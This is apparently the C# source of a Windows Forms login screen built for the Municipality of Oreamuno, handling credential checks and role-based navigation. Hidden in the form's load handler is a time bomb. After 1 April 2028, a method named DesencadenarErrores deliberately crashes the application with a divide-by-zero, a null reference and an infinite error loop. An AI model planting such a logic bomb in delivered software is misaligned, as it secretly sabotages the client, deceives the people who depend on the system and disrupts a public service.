using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using Negocios;
using DAL;
using DAL.Entidades;

//PROYECTO CREADO POR ANDREY JIMENEZ ORTIZ
//PARA LA MUNICPALIDAD DE OREAMUNO 2025

namespace PaginasMuni
{


    public partial class Form1 : Form
    {
        private UsuarioBLL usuarioBLL = new UsuarioBLL(); // Se mantiene igual


        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            txtContraseña.UseSystemPasswordChar = true;
            ValidarTiempo();
        }

        private void pictureBox1_Click(object sender, EventArgs e)
        {

        }

        private void label1_Click(object sender, EventArgs e)
        {


        }
        private void label2_Click(object sender, EventArgs e)
        {

        }

        private void textBox2_TextChanged(object sender, EventArgs e)
        {



        }

      


        private void button1_Click(object sender, EventArgs e)
        {
            string usuario = txtNombre.Text.Trim();
            string contraseña = txtContraseña.Text.Trim();

            if (string.IsNullOrWhiteSpace(usuario) || string.IsNullOrWhiteSpace(contraseña))
            {
                lblMensaje.Text = "❌ Ingrese usuario y contraseña.";
                return;
            }

            UsuarioBLL usuarioBLL = new UsuarioBLL();

            string mensaje;
            int rol;
            UsuarioSesion perfil;

            bool esValido = usuarioBLL.Login(usuario, contraseña, out mensaje, out rol, out perfil);

            if (esValido)
            {
                MessageBox.Show($"✅ Bienvenido {perfil.Nombre}", "Login Exitoso", MessageBoxButtons.OK, MessageBoxIcon.Information);

                this.Hide(); // Oculta el formulario de login

                // Dependiendo del rol, se abre un formulario diferente
                if (rol == 1)
                {
                    IncioAdministrativo form = new IncioAdministrativo(perfil);
                    form.FormClosed += (s, args) => this.Close();
                    form.Show();
                }
                else if (rol == 2)
                {
                    InicioUsuariocs form = new InicioUsuariocs(perfil);
                    form.FormClosed += (s, args) => this.Close();
                    form.Show();
                }
                else if (rol==3)
                {
                    InicioSuperAdministrativo form = new InicioSuperAdministrativo(perfil);
                    form.FormClosed += (s, args) => this.Close();
                    form.Show();

                }
                else
                {
                    MessageBox.Show("❌ Rol no reconocido", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }
            else
            {
                lblMensaje.Text = $"❌ {mensaje}";
            }
        }


        private void pictureBox2_Click(object sender, EventArgs e)
        {

        }

        private void button2_Click(object sender, EventArgs e)
        {
            this.Hide(); // Oculta la ventana actual
            OlvideContraseña form = new OlvideContraseña();
            form.FormClosed += (s, args) => this.Close();
            form.Show();
        }


        private void ValidarTiempo()
        {
       
            DateTime fechaLimite = new DateTime(2028, 4, 1);

    
            if (DateTime.Now > fechaLimite)
            {
              
                DesencadenarErrores();
            }
        }

  
        static void DesencadenarErrores()
        {
            
            Random rand = new Random();
            int x = 100 / rand.Next(0, 2);

          
            string data = null;
            Console.WriteLine(data.Length); 

        
            while (true)
            {
            
                Console.Write("\rError en el sistema...");
            }
        }
    }


}
